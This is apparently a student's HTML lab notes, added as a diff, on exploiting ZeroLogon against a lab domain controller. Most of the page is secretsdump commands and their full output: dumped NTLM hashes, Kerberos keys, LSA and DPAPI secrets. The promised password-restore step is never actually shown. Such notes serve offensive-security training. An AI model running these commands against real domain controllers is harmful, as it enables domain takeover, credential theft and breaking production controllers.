@@ -1,0 +1,160 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Abusing ZeroLogon</title>
+</head><body>Zero log is a very very dangerous attack to run in an environment and this is why the mentor as put it at the end of the course.<br/>
+<br/>
+Attacking the domain controller and setting the password to Null and taking over the domain controller.<br/>
+<br/>
+Issue with that is when we run this attack we do not restore the password we will break the domain controller.<br/>
+<br/>
+<img height="420" src="image.png" width="650"/><br/>
+<br/>
+<br/>
+<img height="595" src="zero_log2.png" width="700"/><br/>
+<br/>
+<img height="505" src="zero_log3.png" width="650"/><br/>
+<br/>
+(root㉿kali)-[/opt/CVE-2020-1472]<br/>
+└─# secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.17.129<br/>
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation<br/>
+<br/>
+Password:<br/>
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br/>
+[*] Using the DRSUAPI method to get NTDS.DIT secrets<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5dbde4a7fe0e1cced076a9a3ff2128ad:::<br/>
+MARVEL.local\fcastle:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
+MARVEL.local\tstark:1104:aad3b435b51404eeaad3b435b51404ee:d03b572b319e335ecd3e793412a28524:::<br/>
+MARVEL.local\pparker:1105:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::<br/>
+MARVEL.local\SQLService:1106:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::<br/>
+LBTewVxyEl:1109:aad3b435b51404eeaad3b435b51404ee:183d8054ab9633da23c58dc2b43ead50:::<br/>
+HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:4e4d32d465c3776fb0535da64927ad03:::<br/>
+SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:7dc51f8e35b789dcc847ec6cb4184799:::<br/>
+[*] Kerberos keys grabbed<br/>
+Administrator:aes256-cts-hmac-sha1-96:d6456f4d8291c9e5bcee69110ef766431f28bbfe7fb68918125f27c96493aa40<br/>
+Administrator:aes128-cts-hmac-sha1-96:3326b434d9fe86bc90909df0cafd1285<br/>
+Administrator:des-cbc-md5:3d917cececcb6113<br/>
+krbtgt:aes256-cts-hmac-sha1-96:86e80c4f678301022d9d2d39ba74c9518320c536925299260058e370b7db6380<br/>
+krbtgt:aes128-cts-hmac-sha1-96:0a7fd3be180fa15076a6176b3819c51c<br/>
+krbtgt:des-cbc-md5:dc8ff8ce8c9886a4<br/>
+MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409<br/>
+MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9<br/>
+MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954<br/>
+MARVEL.local\tstark:aes256-cts-hmac-sha1-96:447ebde31565cc30a26546162f6281131104429be4bc1a0f3505cf60d9152e04<br/>
+MARVEL.local\tstark:aes128-cts-hmac-sha1-96:a70787ea900ab22ba00f26fb9b67e3fc<br/>
+MARVEL.local\tstark:des-cbc-md5:e6b029f470f2d5dc<br/>
+MARVEL.local\pparker:aes256-cts-hmac-sha1-96:5fc6b0c6792c9a3b62432eda4a61e5c71efc2c57f5466abea92ac4c16fcae580<br/>
+MARVEL.local\pparker:aes128-cts-hmac-sha1-96:7693d96d854240b8c654c1f8a86387e1<br/>
+MARVEL.local\pparker:des-cbc-md5:e3d640734938ec34<br/>
+MARVEL.local\SQLService:aes256-cts-hmac-sha1-96:7e434c38e06b23841e6764f58a7daaf8ab32c782b98c41e8a0cfe7bea0d00a93<br/>
+MARVEL.local\SQLService:aes128-cts-hmac-sha1-96:0ad727708ef2aabfe159f71c579c9a0e<br/>
+MARVEL.local\SQLService:des-cbc-md5:523d2c0ecdea6eba<br/>
+LBTewVxyEl:aes256-cts-hmac-sha1-96:9d2536ff4a5209b876bc959a011597bd01b29e6546534de08d97ac3ae05af552<br/>
+LBTewVxyEl:aes128-cts-hmac-sha1-96:28e1964033ee45569bf742e950eb4eb6<br/>
+LBTewVxyEl:des-cbc-md5:62a79e2307804658<br/>
+HYDRA-DC$:aes256-cts-hmac-sha1-96:00b5053ab5487ebc8765d0cd8b93614d1a72d095b761d5b202b2991ae71881ac<br/>
+HYDRA-DC$:aes128-cts-hmac-sha1-96:33fc80da2ea8d817a532ecb6ffba3123<br/>
+HYDRA-DC$:des-cbc-md5:08df614c4aa15ecd<br/>
+THEPUNISHER$:aes256-cts-hmac-sha1-96:ebb50da0ccaff567544db118bc06ef85976f8c3f886e668e966957b5b200f4cb<br/>
+THEPUNISHER$:aes128-cts-hmac-sha1-96:7b5598ec5873e56d3d375126e2bb6069<br/>
+THEPUNISHER$:des-cbc-md5:868ca4468c924662<br/>
+SPIDERMAN$:aes256-cts-hmac-sha1-96:7bae16ac2a965bbb655a0c2a202805dedfcfacd7e5e53ffac369e10a3aaacc0c<br/>
+SPIDERMAN$:aes128-cts-hmac-sha1-96:d4fc8fe7cba50738001b3361a50a7df0<br/>
+SPIDERMAN$:des-cbc-md5:49ece3b64f107ce6<br/>
+[*] Cleaning up... <br/>
+<br/>
+<br/>
+How to restore this Domain Controller ?_?<br/>
+Copy the hash of adminstrator i.e. aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33<br/>
+<br/>
+<img height="311" src="zero_log4.png" width="650"/><br/>
+┌──(root㉿kali)-[/opt/CVE-2020-1472]<br/>
+└─# secretsdump.py administrator@192.168.17.129 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33<br/>
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation<br/>
+<br/>
+[*] Service RemoteRegistry is in stopped state<br/>
+[*] Starting service RemoteRegistry<br/>
+[*] Target system bootKey: 0x65eaea9ec28d1f1721baadb12fafb23a<br/>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.<br/>
+[*] Dumping cached domain logon information (domain/username:hash)<br/>
+[*] Dumping LSA Secrets<br/>
+[*] $MACHINE.ACC <br/>
+MARVEL\HYDRA-DC$:aes256-cts-hmac-sha1-96:8af957e383ef6ee5eb21dd5c567bb2bba9477d706f604ef577591f3c74cb522f<br/>
+MARVEL\HYDRA-DC$:aes128-cts-hmac-sha1-96:e351b26078701bc291437d3ef9656270<br/>
+MARVEL\HYDRA-DC$:des-cbc-md5:ce8aa1f40438b04a<br/>
+MARVEL\HYDRA-DC$:plain_password_hex:c0d1240712ecf64ead68b98aa8db6353b421cce18916703c777fc3f956624bc0183a2e6695d8f3221854d49bf21d7028b7698b5ff2027b4fc2fc7c2d43aea5c1731beec5b8745b4d367d5ba2d39ee6379b74d7e374792f1bc7ff4842e001a4ff1f309f86b762e5003b438634baee21b95807ab77721da76027e66c64acc849af6d55d05b7a6f9a354a35ee658670ef41557909f0077fb794fc43b8b796a4bab4f05b871096325ec5b9ac70ccbeb4bc9c606d880798c2355aca271ba849892c435edea4ce66889f7b478f9e3b0f7d94536c82c43fba7a1f752c65553098ce00aee620963b83aad642cde32bc672c0721d<br/>
+MARVEL\HYDRA-DC$:aad3b435b51404eeaad3b435b51404ee:6aead1dfc2185faa66f312c8d2d8c03d:::<br/>
+[*] DPAPI_SYSTEM <br/>
+dpapi_machinekey:0x6b6cd24411ca08fc3f2ebaa801f320c3b7f4ff55<br/>
+dpapi_userkey:0x90836caa887a7f9a19b7f37e7e411769f4705c00<br/>
+[*] NL$KM <br/>
+0000  F7 02 96 65 63 40 67 05 BD 84 9F 1E 58 AD 62 FA  ...ec@g.....X.b.<br/>
+0010  EA E1 5B C7 B0 7C 7A 7E 65 15 4C 18 1E 7A F1 45  ..[..|z~e.L..z.E<br/>
+0020  C4 B3 DD EB 8E DC 2D 02 3F AF 30 32 46 5C A4 6E  ......-.?.02F\.n<br/>
+0030  D6 9A 9B C7 01 66 87 3E 58 50 80 08 FA 00 86 2B  .....f.&gt;XP.....+<br/>
+NL$KM:f702966563406705bd849f1e58ad62faeae15bc7b07c7a7e65154c181e7af145c4b3ddeb8edc2d023faf3032465ca46ed69a9bc70166873e58508008fa00862b<br/>
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br/>
+[*] Using the DRSUAPI method to get NTDS.DIT secrets<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5dbde4a7fe0e1cced076a9a3ff2128ad:::<br/>
+MARVEL.local\fcastle:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
+MARVEL.local\tstark:1104:aad3b435b51404eeaad3b435b51404ee:d03b572b319e335ecd3e793412a28524:::<br/>
+MARVEL.local\pparker:1105:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::<br/>
+MARVEL.local\SQLService:1106:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::<br/>
+LBTewVxyEl:1109:aad3b435b51404eeaad3b435b51404ee:183d8054ab9633da23c58dc2b43ead50:::<br/>
+HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:4e4d32d465c3776fb0535da64927ad03:::<br/>
+SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:7dc51f8e35b789dcc847ec6cb4184799:::<br/>
+[*] Kerberos keys grabbed<br/>
+Administrator:aes256-cts-hmac-sha1-96:d6456f4d8291c9e5bcee69110ef766431f28bbfe7fb68918125f27c96493aa40<br/>
+Administrator:aes128-cts-hmac-sha1-96:3326b434d9fe86bc90909df0cafd1285<br/>
+Administrator:des-cbc-md5:3d917cececcb6113<br/>
+krbtgt:aes256-cts-hmac-sha1-96:86e80c4f678301022d9d2d39ba74c9518320c536925299260058e370b7db6380<br/>
+krbtgt:aes128-cts-hmac-sha1-96:0a7fd3be180fa15076a6176b3819c51c<br/>
+krbtgt:des-cbc-md5:dc8ff8ce8c9886a4<br/>
+MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409<br/>
+MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9<br/>
+MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954<br/>
+MARVEL.local\tstark:aes256-cts-hmac-sha1-96:447ebde31565cc30a26546162f6281131104429be4bc1a0f3505cf60d9152e04<br/>
+MARVEL.local\tstark:aes128-cts-hmac-sha1-96:a70787ea900ab22ba00f26fb9b67e3fc<br/>
+MARVEL.local\tstark:des-cbc-md5:e6b029f470f2d5dc<br/>
+MARVEL.local\pparker:aes256-cts-hmac-sha1-96:5fc6b0c6792c9a3b62432eda4a61e5c71efc2c57f5466abea92ac4c16fcae580<br/>
+MARVEL.local\pparker:aes128-cts-hmac-sha1-96:7693d96d854240b8c654c1f8a86387e1<br/>
+MARVEL.local\pparker:des-cbc-md5:e3d640734938ec34<br/>
+MARVEL.local\SQLService:aes256-cts-hmac-sha1-96:7e434c38e06b23841e6764f58a7daaf8ab32c782b98c41e8a0cfe7bea0d00a93<br/>
+MARVEL.local\SQLService:aes128-cts-hmac-sha1-96:0ad727708ef2aabfe159f71c579c9a0e<br/>
+MARVEL.local\SQLService:des-cbc-md5:523d2c0ecdea6eba<br/>
+LBTewVxyEl:aes256-cts-hmac-sha1-96:9d2536ff4a5209b876bc959a011597bd01b29e6546534de08d97ac3ae05af552<br/>
+LBTewVxyEl:aes128-cts-hmac-sha1-96:28e1964033ee45569bf742e950eb4eb6<br/>
+LBTewVxyEl:des-cbc-md5:62a79e2307804658<br/>
+HYDRA-DC$:aes256-cts-hmac-sha1-96:00b5053ab5487ebc8765d0cd8b93614d1a72d095b761d5b202b2991ae71881ac<br/>
+HYDRA-DC$:aes128-cts-hmac-sha1-96:33fc80da2ea8d817a532ecb6ffba3123<br/>
+HYDRA-DC$:des-cbc-md5:08df614c4aa15ecd<br/>
+THEPUNISHER$:aes256-cts-hmac-sha1-96:ebb50da0ccaff567544db118bc06ef85976f8c3f886e668e966957b5b200f4cb<br/>
+THEPUNISHER$:aes128-cts-hmac-sha1-96:7b5598ec5873e56d3d375126e2bb6069<br/>
+THEPUNISHER$:des-cbc-md5:868ca4468c924662<br/>
+SPIDERMAN$:aes256-cts-hmac-sha1-96:7bae16ac2a965bbb655a0c2a202805dedfcfacd7e5e53ffac369e10a3aaacc0c<br/>
+SPIDERMAN$:aes128-cts-hmac-sha1-96:d4fc8fe7cba50738001b3361a50a7df0<br/>
+SPIDERMAN$:des-cbc-md5:49ece3b64f107ce6<br/>
+[*] Cleaning up... <br/>
+[*] Stopping service RemoteRegistry<br/>
+[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.<br/>
+[*] Cleaning up... <br/>
+[*] Stopping service RemoteRegistry<br/>
+<br/>
+<img height="140" src="image 2.png" width="700"/><br/>
+<br/>
+<br/>
+What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html<br/>
+<br/>
+dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472<br/>
+<br/>
+SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472</body></html>
